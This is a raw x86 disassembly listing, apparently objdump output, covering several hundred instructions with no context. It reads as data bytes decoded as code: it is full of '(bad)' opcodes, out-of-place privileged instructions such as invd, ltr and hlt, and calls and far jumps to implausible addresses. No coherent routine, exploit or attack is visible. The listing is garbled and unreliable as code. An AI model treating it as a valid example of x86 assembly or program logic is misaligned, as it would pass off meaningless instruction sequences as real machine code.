  431f2c:	jne    0x431eef
  431f2e:	mov    eax,DWORD PTR [ebp-0x28]
  431f31:	add    DWORD PTR [eax],0xe8058dec
  431f37:	clc    
  431f38:	mov    esi,DWORD PTR [edi-0x8]
  431f3b:	add    dh,dl
  431f3d:	rol    WORD PTR [ebp-0x1],cl
  431f41:	mov    edx,DWORD PTR [eax+0x8]
  431f44:	jne    0x431f06
  431f46:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f4d:	inc    ebp
  431f4e:	push   esp
  431f4f:	test   DWORD PTR [ecx+0xf],ecx
  431f52:	sub    edx,esp
  431f54:	add    eax,DWORD PTR [eax]
  431f56:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f5c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f63:	mov    eax,DWORD PTR [ecx]
  431f65:	and    BYTE PTR [eax],al
  431f67:	cmp    dl,BYTE PTR [eax]
  431f69:	add    BYTE PTR [ebp+0x66],al
  431f6c:	inc    ecx
  431f6e:	push   esp
  431f6f:	add    BYTE PTR [ebp+0x0],dh
  431f72:	push   edx
  431f73:	enterw 0xc1,0x4d
  431f78:	mov    esp,DWORD PTR [esi+0x20]
  431f7b:	add    DWORD PTR [ecx-0x7b],eax
  431f7e:	add    eax,DWORD PTR [ebx]
  431f80:	str    WORD PTR [eax+0x45]
  431f84:	lea    ecx,[ebx+0x45890801]
  431f8a:	sbb    BYTE PTR [ebx],al
  431f8c:	dec    ebp
  431f8d:	cmp    al,0xf
  431f8f:	inc    ebp
  431f90:	push   eax
  431f91:	mov    esi,DWORD PTR [ebx]
  431f93:	push   eax
  431f94:	add    eax,eax
  431f96:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431f9d:	inc    ebp
  431f9e:	add    BYTE PTR ds:0x8b4d8c00,dh
  431fa4:	xor    edx,esp
  431fa6:	add    eax,esi
  431fa8:	mov    ebx,eax
  431faa:	loopne 0x431ff1
  431fac:	dec    ebp
  431fad:	mov    ecx,DWORD PTR [edi]
  431faf:	cld    
  431fb0:	push   eax
  431fb1:	xchg   DWORD PTR [ebx],esi
  431fb3:	add    DWORD PTR [ebx],ebp
  431fb5:	add    BYTE PTR [ebx],ch
  431fb7:	or     BYTE PTR [ecx],bh
  431fb9:	dec    ecx
  431fba:	loopne 0x431fbf
  431fbc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431fc2:	push   ebp
  431fc3:	add    DWORD PTR [ebx+0x55100800],eax
  431fc9:	dec    ebp
  431fca:	jmp    0x431f55
  431fcc:	mov    esp,DWORD PTR [eax]
  431fce:	sbb    dl,dl
  431fd0:	inc    eax
  431fd1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  431fd7:	add    BYTE PTR [ebx+0x74528555],cl
  431fdd:	push   ebp
  431fde:	div    DWORD PTR [ebx]
  431fe0:	and    eax,DWORD PTR [ebx]
  431fe2:	add    edx,DWORD PTR [edx-0x30]
  431fe5:	jno    0x431f72
  431fe7:	inc    DWORD PTR [eax+eiz*1]
  431fea:	inc    ebp
  431feb:	push   eax
  431fec:	push   eax
  431fed:	mov    esp,DWORD PTR [edi-0x74beff1c]
  431ff3:	mov    edi,esp
  431ff5:	push   eax
  431ff6:	inc    ebp
  431ff7:	enter  0x458b,0x8
  431ffb:	push   ecx
  431ffc:	(bad)  
  431ffd:	call   0x10d29d5
  432002:	pop    ss
  432003:	push   ebp
  432004:	mov    ecx,DWORD PTR [ebx+0x489408]
  43200a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432010:	push   ecx
  432011:	jo     0x431ffb
  432013:	inc    DWORD PTR [edi]
  432015:	or     BYTE PTR [eax],al
  432017:	call   0xce2761
  43201c:	fmul   QWORD PTR [ebp+0x55]
  43201f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432025:	mov    bh,0x8c
  432027:	adc    al,0x9a
  432029:	dec    esp
  43202a:	xor    bl,BYTE PTR [eax]
  43202c:	mov    ecx,DWORD PTR [ebp+0xc]
  43202f:	mov    eax,DWORD PTR [ebp-0x4]
  432032:	mov    esi,DWORD PTR [edi-0x3148f924]
  432038:	push   es
  432039:	retf   
  43203a:	mov    BYTE PTR [ebp-0x30],0x3b
  43203e:	inc    ebp
  43203f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432046:	retf   0x83fc
  432049:	into   
  43204a:	dec    ebp
  43204b:	retf   
  43204c:	mov    ecx,DWORD PTR [ebp-0x74]
  43204f:	mov    eax,DWORD PTR [eax]
  432051:	fdiv   QWORD PTR [ebx]
  432053:	mov    bh,0x3
  432055:	push   es
  432056:	mov    esi,ecx
  432058:	sbb    cl,dl
  43205a:	dec    ebp
  43205b:	sar    DWORD PTR [ebx],cl
  43205d:	push   ebp
  43205e:	jne    0x43206f
  432060:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432066:	lea    ebx,[eax]
  432068:	call   0xf4ccac2f
  43206d:	sbb    dh,dl
  43206f:	add    edx,ebx
  432071:	push   ebp
  432072:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432078:	push   ecx
  432079:	mov    DWORD PTR [eax-0x30],edx
  43207c:	test   DWORD PTR [edx],eax
  43207e:	xadd   esp,esi
  432081:	pop    es
  432082:	add    cl,dl
  432084:	mov    eax,ecx
  432086:	or     al,0x45
  432088:	(bad)  
  432089:	push   eax
  43208a:	add    DWORD PTR [edx+0x0],eax
  43208d:	add    ecx,DWORD PTR [ecx]
  43208f:	and    dh,cl
  432091:	call   0xc72961
  432096:	add    DWORD PTR [ebp+0x0],edx
  432099:	mov    esp,DWORD PTR [ebp+0x18]
  43209c:	add    BYTE PTR [eax+0x54],cl
  43209f:	xor    eax,DWORD PTR [eax]
  4320a1:	add    esp,DWORD PTR [esi+0x3b]
  4320a4:	inc    ebp
  4320a5:	je     0x43202a
  4320a7:	push   ecx
  4320a8:	cli    
  4320a9:	dec    ebp
  4320aa:	mov    DWORD PTR [ebx],eax
  4320ac:	(bad)  
  4320ad:	or     al,0x5e
  4320af:	inc    eax
  4320b0:	add    BYTE PTR [ebx],al
  4320b2:	data16 and BYTE PTR [ebp+0x50],al
  4320b6:	sub    DWORD PTR [ecx],0xfffffff8
  4320b9:	add    BYTE PTR [ebp-0x75],ah
  4320bc:	add    BYTE PTR [eax],bl
  4320be:	enter  0x894d,0x8b
  4320c2:	int3   
  4320c3:	loopne 0x4320ff
  4320c5:	rol    BYTE PTR [eax],0x33
  4320c8:	lea    cx,[ebp+0xa]
  4320cc:	data16 jb 0x432114
  4320cf:	add    BYTE PTR [ebx+0x44890855],cl
  4320d5:	sbb    ah,al
  4320d7:	inc    ebp
  4320d8:	cmp    cl,BYTE PTR [edi]
  4320da:	add    BYTE PTR [edx+0x66],dl
  4320dd:	xor    ecx,DWORD PTR [eax]
  4320df:	sub    eax,DWORD PTR [eax]
  4320e1:	mov    eax,DWORD PTR [eax]
  4320e3:	or     al,0x66
  4320e5:	ror    edx,cl
  4320e7:	dec    ebp
  4320e8:	inc    ebp
  4320e9:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4320ef:	cld    
  4320f0:	or     BYTE PTR [edi+0x4501dd],dl
  4320f6:	ror    dh,0xee
  4320f9:	retf   
  4320fa:	(bad)  
  4320fb:	dec    ebp
  4320fc:	mov    al,0x8b
  4320fe:	loop   0x432120
  432100:	cmp    ecx,DWORD PTR [edx]
  432102:	inc    ebp
  432103:	daa    
  432104:	loop   0x43208d
  432106:	out    dx,al
  432107:	add    edi,eax
  432109:	add    BYTE PTR [eax+0x3f52ed55],bh
  43210f:	push   ebp
  432110:	inc    ebp
  432111:	xor    ebx,eax
  432113:	add    ebp,esi
  432115:	push   edx
  432116:	push   bp
  432118:	inc    ebp
  432119:	(bad)  
  43211a:	jmp    0xc342e773
  43211f:	sbb    al,0x33
  432121:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432128:	add    BYTE PTR [ebp+0x45],0x8b
  43212c:	jmp    0xf98b:0x100041c8
  432133:	xor    esi,DWORD PTR [edx+0x3]
  432136:	mov    ecx,DWORD PTR [edi]
  432138:	fmul   DWORD PTR [edx]
  43213a:	add    BYTE PTR [eax],al
  43213c:	lea    eax,[ebx-0x4700273c]
  432142:	add    al,0x4f
  432144:	pop    DWORD PTR [eax]
  432146:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43214c:	push   edx
  43214d:	inc    WORD PTR [ebp+0x8]
  432151:	mov    eax,0x514f4d
  432156:	(bad)
  43215a:	add    al,al
  43215c:	xor    DWORD PTR [ebx-0x74baf730],eax
  432162:	test   DWORD PTR [esi+0x74],esp
  432165:	inc    ebp
  432166:	mov    DWORD PTR [eax+0xa4f08],edi
  43216c:	add    BYTE PTR [ecx-0x76c435bb],cl
  432172:	or     dh,cl
  432174:	or     eax,0x8b8d5045
  432179:	inc    ebp
  43217a:	mov    WORD PTR [ecx+0x3b8a00],?
  432180:	jne    0x4321b5
  432182:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432188:	add    DWORD PTR [ebx],eax
  43218a:	add    bh,bh
  43218c:	adc    DWORD PTR [eax],ecx
  43218e:	adc    DWORD PTR [ebp+0x55],edi
  432191:	push   es
  432192:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432198:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43219f:	inc    ebp
  4321a0:	mov    esp,edi
  4321a2:	or     al,0xd8
  4321a4:	push   eax
  4321a5:	(bad)  
  4321a6:	jne    0x43215c
  4321a8:	call   0x3b1a95
  4321ad:	inc    ebp
  4321ae:	sar    BYTE PTR [edx],0x84
  4321b1:	out    dx,al
  4321b2:	add    bh,al
  4321b4:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  4321bb:	(bad)  
  4321bc:	and    al,al
  4321be:	fs jmp 0x7cc867c3
  4321c4:	bswap  ecx
  4321c6:	scas   al,BYTE PTR es:[edi]
  4321c7:	inc    esp
  4321c8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4321cf:	or     BYTE PTR [ebx-0x97717c7],0x83
  4321d6:	call   DWORD PTR [edi]
  4321d8:	shr    ah,0x84
  4321db:	xchg   DWORD PTR [eax],eax
  4321dd:	add    DWORD PTR [eax],eax
  4321df:	add    bh,bh
  4321e1:	dec    ebp
  4321e2:	and    BYTE PTR [ecx-0x38],dl
  4321e5:	push   eax
  4321e6:	dec    DWORD PTR [ebx+0xfd885]
  4321ec:	mov    BYTE PTR [ebp+0x508bac00],cl
  4321f2:	mov    WORD PTR [ecx+0x0],ss
  4321f5:	lea    ecx,[ebx+0x108b20d8]
  4321fb:	mov    WORD PTR [edx],ds
  4321fd:	add    BYTE PTR [edi+0xff01ff],al
  432203:	mov    ecx,DWORD PTR [ebp-0x28]
  432206:	push   ecx
  432207:	shl    BYTE PTR [ebp+0x3a],0x8b
  43220b:	inc    ebp
  43220c:	in     al,0xeb
  43220e:	jno    0x43219b
  432210:	push   edx
  432211:	mov    DWORD PTR [eax-0x28],edx
  432214:	mov    eax,DWORD PTR [ebp+0x20]
  432217:	je     0x4321a0
  432219:	mov    eax,DWORD PTR [ecx]
  43221b:	sbb    BYTE PTR [eax],al
  43221d:	pop    DWORD PTR [eax]
  43221f:	add    esi,eax
  432221:	add    bl,al
  432223:	adc    DWORD PTR [edi],esi
  432225:	jmp    0x8bce7277
  43222a:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  432231:	jne    0x4321be
  432233:	mov    ecx,DWORD PTR [eax]
  432235:	in     al,0x75
  432237:	pop    DWORD PTR [ecx+0x5301]
  43223d:	push   edx
  43223e:	inc    DWORD PTR [ebx]
  432240:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432246:	add    BYTE PTR [edi+0x9],dl
  432249:	call   DWORD PTR [esi]
  43224b:	and    dl,al
  43224d:	and    bh,bh
  43224f:	inc    edi
  432251:	test   eax,edx
  432253:	sldt   ebx
  432256:	xor    al,0x0
  432258:	pushf  
  432259:	(bad)  
  43225a:	jmp    0x432268
  43225c:	mov    eax,edi
  43225e:	or     al,0x75
  432260:	inc    eax
  432261:	call   0x431969
  432266:	mov    eax,eax
  432268:	loopne 0x4321ee
  43226a:	inc    ebp
  43226b:	add    BYTE PTR [ebx+0x1451c00],cl
  432271:	mov    eax,DWORD PTR [ebp+0x20]
  432274:	add    edi,ecx
  432276:	add    BYTE PTR [eax],ch
  432278:	cmp    edi,0x18
  43227b:	test   DWORD PTR [ebp+0xf],esi
  43227e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432285:	jne    0x432289
  432287:	call   0xffa21d4c
  43228c:	leave  
  43228d:	rcr    BYTE PTR [esp+eax*4],0x55
  432291:	add    ah,ch
  432293:	add    BYTE PTR [edi-0x48fef979],dh
  432299:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322a0:	inc    esp
  4322a1:	mov    ebx,DWORD PTR [eax]
  4322a3:	fcom   st(2)
  4322a5:	add    BYTE PTR [edi],bl
  4322a7:	lea    ecx,[eax-0x18]
  4322aa:	(bad)  
  4322ab:	push   DWORD PTR [ecx]
  4322ad:	call   0xffb5700f
  4322b2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322b6:	fstp   DWORD PTR [esi+ebx*8]
  4322b9:	push   ebp
  4322ba:	pop    ebp
  4322bb:	mov    esi,DWORD PTR [edx-0x38]
  4322be:	add    DWORD PTR [eax],0x28
  4322c1:	mov    edi,DWORD PTR [ebx]
  4322c3:	xor    esi,DWORD PTR [edx+0x3]
  4322c6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4322ca:	pop    ebp
  4322cb:	or     al,0x4
  4322cd:	inc    ecx
  4322ce:	push   ebp
  4322cf:	(bad)  
  4322d0:	in     al,dx
  4322d1:	or     ah,ch
  4322d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4322d4:	xbegin 0xffc898ca
  4322da:	clc    
  4322db:	adc    al,0x45
  4322dd:	div    BYTE PTR [eax+ecx*1]
  4322e0:	pushf  
  4322e1:	add    bh,al
  4322e3:	jne    0x4322bd
  4322e5:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  4322ef:	add    eax,DWORD PTR [ebp+0x52]
  4322f2:	adc    eax,0x20
  4322f5:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  4322fb:	test   DWORD PTR [eax],eax
  4322fd:	clc    
  4322fe:	data16 or al,BYTE PTR [ebp+0x45]
  432302:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432309:	rol    BYTE PTR [ebp+0x45],1
  43230c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432312:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432318:	push   ebx
  432319:	add    BYTE PTR [ebx+0x0],dl
  43231c:	push   ecx
  43231d:	jge    0x432352
  43231f:	add    BYTE PTR [esi+0x4],dl
  432322:	jne    0x432389
  432324:	mov    edx,0x457200
  432329:	jmp    0x4322ed
  43232b:	xor    edi,DWORD PTR [ebx]
  43232d:	pop    edi
  43232e:	cvtdq2ps xmm7,xmm0
  432331:	ret    0x0
  432334:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43233a:	xor    ecx,DWORD PTR [edi]
  43233c:	add    eax,DWORD PTR [ecx+0x3b]
  43233f:	push   ebx
  432340:	rdpmc  
  432342:	out    0x8d,al
  432344:	add    BYTE PTR [eax],cl
  432346:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43234c:	ret    0x450c
  43234f:	sbb    al,0x8b
  432351:	cmp    eax,esi
  432353:	or     cl,al
  432355:	or     al,0xc2
  432357:	pop    eax
  432358:	inc    ebp
  432359:	add    ecx,DWORD PTR [edi]
  43235b:	add    esi,DWORD PTR [ebp+0x39]
  43235e:	invd   
  432360:	jge    0x43236c
  432362:	mov    eax,0x478ac0
  432367:	cli    
  432368:	xor    esp,ecx
  43236a:	mov    ebx,0x5b8ac0
  43236f:	ret    0x33
  432372:	mov    eax,0x833b8b
  432377:	sub    BYTE PTR [ebx],al
  432379:	inc    ebp
  43237a:	xor    ax,0x9cf8
  43237e:	inc    bh
  432380:	mov    esp,esp
  432382:	hlt    
  432383:	test   DWORD PTR [ebp-0x8],esi
  432386:	mov    eax,DWORD PTR [ebp-0x14]
  432389:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43238f:	dec    edi
  432390:	or     BYTE PTR [eax],al
  432392:	jne    0x43231d
  432394:	mov    esi,esp
  432396:	call   0x77a9af5b
  43239b:	inc    ebp
  43239c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  4323a2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323a8:	add    BYTE PTR [esi+0x7d],ah
  4323ab:	inc    ebp
  4323ac:	mov    bx,WORD PTR [ebp+0x8]
  4323b0:	add    DWORD PTR [ebp+0x53],0x30c008b
  4323b7:	inc    ebp
  4323b8:	mov    bx,di
  4323bb:	lock test BYTE PTR [ecx+0x7000801],bh
  4323c2:	jge    0x432385
  4323c4:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  4323ca:	cli    
  4323cb:	xor    bl,bh
  4323cd:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4323d3:	test   BYTE PTR [eax],cl
  4323d5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4323dc:	cmp    ebp,eax
  4323de:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4323e5:	test   BYTE PTR [ebp+0x1],bh
  4323e8:	mov    ebx,0x458a00
  4323ed:	xor    esi,DWORD PTR [ebx]
  4323ef:	add    esp,DWORD PTR [esi-0x77]
  4323f2:	pop    ebp
  4323f3:	loopne 0x43245b
  4323f5:	inc    ebp
  4323f6:	clc    
  4323f7:	xor    edi,DWORD PTR [ebx]
  4323f9:	add    esi,DWORD PTR [edx-0x77]
  4323fc:	data16 fdivr QWORD PTR [ebp-0x49]
  432400:	mov    ebx,0xb78afc
  432405:	hlt    
  432406:	xor    edi,DWORD PTR [edx]
  432408:	data16 add BYTE PTR [ebp+0x66],bl
  43240c:	data16 lock clc 
  43240f:	cmp    bh,BYTE PTR [ebx]
  432411:	add    BYTE PTR [edi+0x66],dh
  432414:	psubq  mm7,QWORD PTR [ebp+0x0]
  432418:	ltr    WORD PTR [ebp+0x66]
  43241c:	add    esi,eax
  43241e:	add    di,WORD PTR [ebp+0x2b]
  432422:	data16 data16 jge 0x4324a3
  432426:	mov    ebx,0xe08a8b
  43242b:	jge    0x432460
  43242d:	data16 data16 xor al,0x5d
  432431:	data16 data16 jne 0x43242d
  432435:	mov    edi,DWORD PTR [ebx]
  432437:	fdiv   QWORD PTR [edx+0x7d]
  43243a:	data16 data16 jge 0x432472
  43243e:	mov    ebx,0x758a66
  432443:	mov    esi,0x667233
  432448:	pop    ebp
  432449:	or     BYTE PTR [esi+0x0],ah
  43244c:	clc    
  43244d:	mov    edi,DWORD PTR [ebx]
  43244f:	lock ja 0x4323dd
  432452:	(bad)  
  432454:	jge    0x43244d
  432456:	invd   
  432458:	pop    ebp
  432459:	add    BYTE PTR [ebx],al
  43245b:	(bad)  
  43245c:	cmp    di,WORD PTR [ebp+0xf]
  432460:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432464:	mov    bx,WORD PTR [ebp-0x10]
  432468:	pop    bp
  43246a:	fbstp  TBYTE PTR [ebx]
  43246c:	test   DWORD PTR [ebx],eax
  43246e:	add    BYTE PTR [ebx],bh
  432470:	add    BYTE PTR [esi+0x7d],ah
  432473:	jge    0x432400
  432475:	data16 in al,dx
  432477:	pop    ebp
  432478:	stc    
  432479:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432480:	mov    edi,ebx
  432482:	in     al,dx
  432483:	test   BYTE PTR [ebp+0x0],bh
  432486:	mov    eax,DWORD PTR [eax]
  432488:	call   0xbd401e18
  43248d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432493:	sti    
  432494:	call   0x8b4ba224
  432499:	add    ebp,esp
  43249b:	mov    bx,di
  43249e:	jnp    0x4324c6
  4324a0:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  4324a6:	mov    eax,DWORD PTR [eax]
  4324a8:	call   0x7c3eb013
  4324ad:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324b3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324b8:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  4324c2:	fisttp WORD PTR [ecx-0x7401f77b]
  4324c8:	(bad)  
  4324c9:	cld    
  4324ca:	jne    0x432506
  4324cc:	xor    eax,DWORD PTR [eax]
  4324ce:	mov    esp,DWORD PTR [esi-0x10]
  4324d1:	sti    
  4324d2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4324d9:	data16 adc bl,bh
  4324dc:	push   ebp
  4324dd:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  4324e4:	mov    WORD PTR [eax],es
  4324e6:	call   0xe48b:0x89fb3266
  4324ed:	or     al,0x55
  4324ef:	add    ecx,DWORD PTR [ebx-0x7420139a]
  4324f5:	push   cs
  4324f6:	push   esi
  4324f7:	mov    bh,0xc8
  4324f9:	or     al,0x2b
  4324fb:	mov    bh,0xba
  4324fd:	hlt    
  4324fe:	mov    bh,bl
  432500:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432506:	dec    edi
  432507:	or     al,0x0
  432509:	mov    edi,DWORD PTR [ebx]
  43250b:	or     BYTE PTR [ebp+0x3b],dh
  43250e:	mov    ecx,DWORD PTR [edi]
  432510:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432516:	xor    al,0xd8
  432518:	pop    bp
  43251a:	lock xor esi,DWORD PTR [ebx]
  43251d:	lea    esp,[esi+0x1f]
  432520:	icebp  
  432521:	jb     0x432527
  432523:	add    al,al
  432525:	jge    0x432533
  432527:	mov    eax,eax
  432529:	fsubr  st,st(3)
  43252b:	pop    ebp
  43252c:	mov    esi,DWORD PTR [ebx]
  43252e:	in     al,0x8d
  432530:	rcr    DWORD PTR [edi],0xc2
  432533:	jb     0x432593
  432535:	add    cl,cl
  432537:	jge    0x432545
  432539:	mov    edx,DWORD PTR [ebp-0x20]
  43253c:	in     al,dx
  43253d:	pop    ebp
  43253e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432543:	cmp    di,WORD PTR [ebp+0x0]
  432547:	mov    ebp,DWORD PTR [ebx]
  432549:	fdivr  QWORD PTR [esi+0x668a5d]
  43254f:	cmp    al,0x33
  432551:	mov    si,0x4f7d
  432555:	mov    eax,DWORD PTR [eax]
  432557:	lock inc ebp
  432559:	mov    esi,DWORD PTR [esi]
  43255b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  432562:	clc    
  432563:	(bad)  
  432564:	cmp    edi,DWORD PTR [ebx]
  432566:	je     0x432577
  432568:	push   ebx
  432569:	loopne 0x43257a
  43256b:	dec    ecx
  43256d:	mov    esp,DWORD PTR [esi-0x1c]
  432570:	int    0xf1
  432572:	mov    esi,0x703084d
  432577:	pcmpgtd mm6,mm1
  43257a:	add    BYTE PTR [ebp+0x66],dh
  43257d:	jmp    0x43254a
  43257f:	mov    eax,DWORD PTR [ebx]
  432581:	lock push ebp
  432583:	ror    DWORD PTR [ebp-0x2972feb3],1
  432589:	or     bh,dl
  43258b:	jb     0x43258b
  43258d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432593:	loopne 0x432595
  432595:	jne    0x432597
  432597:	data16 add BYTE PTR [esi+eiz*2],dh
  43259b:	mov    ecx,ebx
  43259d:	data16 cmp dh,cl
  4325a0:	add    BYTE PTR [edx],bh
  4325a2:	data16 add bl,cl
  4325a5:	data16 cmp dh,dl
  4325a8:	add    BYTE PTR [edx],bh
  4325aa:	data16 add bl,cl
  4325ad:	enterw 0x4df1,0x19
  4325b2:	pop    edi
  4325b3:	jne    0x432536
  4325b5:	mov    esi,DWORD PTR [esi]
  4325b7:	call   0x77b7b158
  4325bc:	xor    ebp,DWORD PTR [ebx]
  4325be:	lea    esp,[esi+0x48]
  4325c1:	repnz in eax,0x3b
  4325c4:	add    BYTE PTR [ebp-0x37],dh
  4325c7:	xor    edx,DWORD PTR [ebp-0x15]
  4325ca:	in     al,dx
  4325cb:	xor    edx,DWORD PTR [esi+0x40]
  4325ce:	mov    DWORD PTR [edi],0x338545fc
  4325d4:	clc    
  4325d5:	add    esi,DWORD PTR ds:0xe85b9c5f
  4325db:	ret    0xff
  4325de:	dec    DWORD PTR [ebx-0x74f8ae08]
  4325e4:	cmp    DWORD PTR [esi+0x45],edx
  4325e7:	add    BYTE PTR [eax+eax*1+0x61],bh
  4325eb:	data16 (bad) 
  4325ed:	into   
  4325ee:	data16 cmp cl,ch
  4325f1:	add    BYTE PTR [ecx+0x7ce0866],bh
  4325f7:	cmp    ah,BYTE PTR [esi+0x0]
  4325fa:	add    bh,al
  4325fc:	add    ah,bh
  4325fe:	add    BYTE PTR [ebp+0x35c3f866],al
  432604:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43260b:	pop    ebp
  43260c:	adc    al,0x57
  43260e:	add    BYTE PTR [edi-0x723c409a],dh
  432614:	add    edi,edi
  432616:	jne    0x43266b
  432618:	lea    edx,[ecx+0x1]
  43261b:	mov    ebx,0xd64ff1
  432620:	sar    DWORD PTR [ebx],1
  432622:	test   BYTE PTR [ebp+0x34],dh
  432625:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432629:	push   edi
  43262a:	xor    BYTE PTR [ebx],0x39
  43262d:	mov    esi,ebx
  43262f:	xor    eax,DWORD PTR [eax-0x3c73839a]
  432635:	xor    al,0x45
  432637:	fs pop ebx
  432639:	mov    ebx,0x9c3b36
  43263e:	je     0x43266b
  432640:	xor    edi,DWORD PTR [ebx+0x668a33]
  432646:	mov    WORD PTR [ebx],?
  432648:	xor    al,0xbb
  43264a:	fs dec edi
  43264c:	mov    eax,DWORD PTR [eax]
  43264e:	pop    edi
  43264f:	cmp    ecx,ecx
  432651:	jne    0x4326a8
  432653:	mov    ebp,esp
  432655:	cld    
  432656:	push   esi
  432657:	pop    ebx
  432658:	inc    ebp
  432659:	stc    
  43265a:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  432662:	clc    
  432663:	test   dl,dl
  432665:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  43266a:	or     bl,al
  43266c:	add    BYTE PTR [ebx+0x57665100],cl
  432672:	retf   0x3a45
  432675:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  43267d:	clc    
  43267e:	add    BYTE PTR [ebx+0x66],bl
  432681:	dec    edx
  432683:	mov    edx,DWORD PTR [edi-0x76]
  432686:	push   edi
  432687:	add    al,0xb7
  432689:	xor    al,0xba
  43268b:	cmp    al,0x8d
  43268d:	je     0x43268e
  43268f:	mov    edx,DWORD PTR [ebx-0x46]
  432692:	push   ecx
  432693:	lea    edi,[ebx+0x534fff]
  432699:	push   ecx
  43269a:	cmp    edx,DWORD PTR [ebx+0x75]
  43269d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326a3:	add    BYTE PTR [ebx],dh
  4326a5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326ab:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  4326b2:	mov    ebx,0x3b3b00
  4326b7:	jne    0x4326e4
  4326b9:	mov    DWORD PTR [ebx+0x728afc],edi
  4326bf:	xor    esi,DWORD PTR [ebx]
  4326c1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4326c7:	push   edi
  4326c8:	cmp    esp,ebp
  4326ca:	jne    0x4326cc
  4326cc:	sbb    DWORD PTR [eax],0x8085c3fc
  4326d2:	clc    
  4326d3:	inc    ebp
  4326d4:	pop    ebx
  4326d5:	sti    
  4326d6:	add    eax,0xeb8bc075
  4326db:	cld    
  4326dc:	xor    edi,DWORD PTR ds:0xf8c3855e
  4326e2:	mov    ecx,DWORD PTR [ecx+edx*2]
  4326e5:	rol    DWORD PTR [ebp-0x37],0xf
  4326e9:	mov    DWORD PTR [eax],ecx
  4326eb:	inc    edi
  4326ec:	(bad)  
  4326ed:	in     eax,0x0
  4326ef:	add    bh,bh
  4326f1:	(bad)  
  4326f2:	mov    esi,0xc38a5e
  4326f7:	mov    esi,DWORD PTR [ebx]
  4326f9:	push   ecx
  4326fa:	mov    edi,0xfc4fc7
  4326ff:	test   DWORD PTR [ebp-0x8],edx
  432702:	xor    ax,0x9cc7
  432706:	sub    ebp,eax
  432708:	inc    ebp
  432709:	(bad)  
  43270a:	sub    edi,edi
  43270c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432712:	inc    ebp
  432713:	add    BYTE PTR [esi+0x2b],ah
  432716:	or     bh,BYTE PTR [edx+0xf8ac2]
  43271c:	cmp    al,0x33
  43271e:	mov    edi,DWORD PTR [edx+0x4f81]
  432724:	(bad)  
  432725:	cmp    esi,DWORD PTR [ebx]
  432727:	je     0x4326e1
  432729:	push   ebx
  43272a:	dec    edi
  43272b:	str    ecx
  43272e:	cmp    esp,DWORD PTR [esi+0x75]
  432731:	int    0x33
  432733:	mov    edi,0x789085f
  432738:	mov    edx,DWORD PTR [esp+edi*8]
  43273b:	add    cl,cl
  43273d:	data16 add al,0xcb
  432740:	push   ebp
  432741:	add    ebp,esp
  432743:	jne    0x432731
  432745:	(bad)  
  432746:	mov    DWORD PTR [ecx],0xd685f7ec
  43274c:	clc    
  43274d:	xlat   BYTE PTR ds:[ebx]
  43274e:	inc    ebp
  43274f:	mov    esi,DWORD PTR [eax+edx*2]
  432752:	pushf  
  432753:	in     eax,0x8b
  432755:	add    ah,ch
  432757:	add    BYTE PTR [ebx+0x0],dl
